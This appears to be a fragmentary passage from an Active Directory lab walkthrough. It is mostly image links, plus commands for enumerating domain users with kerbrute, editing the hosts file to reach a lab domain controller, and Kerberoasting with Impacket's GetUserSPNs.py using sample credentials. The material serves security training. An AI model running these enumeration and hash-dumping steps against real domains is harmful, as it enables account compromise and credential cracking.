...
3.) `./kerbrute userenum --dc <ip> -d CONTROLLER.local User.txt` - This will brute force user accounts from a domain controller using a supplied wordlist
...
```
echo 10.10.143.102 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
...
2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.143.102 -request` - this will dump the Kerberos hash for all kerberoastable accounts it  can find on the target domain just like Rubeus does; however, this does  not have to be on the targets machine and can be done remotely.
...
![img](https://i.imgur.com/V6SOlll.png)
...
![img](https://i.imgur.com/SJQGplV.png)
...
![img](https://i.imgur.com/xC0L5Kf.png)
...
![img](https://i.imgur.com/DwXmm8Z.png)
...
![img](https://i.imgur.com/GgxDm9k.png)
...
![img](https://i.imgur.com/9nxjeTS.png)
...
![img](https://i.imgur.com/GT1kkfo.png)
...
![img](https://i.imgur.com/VOEsU4O.png)
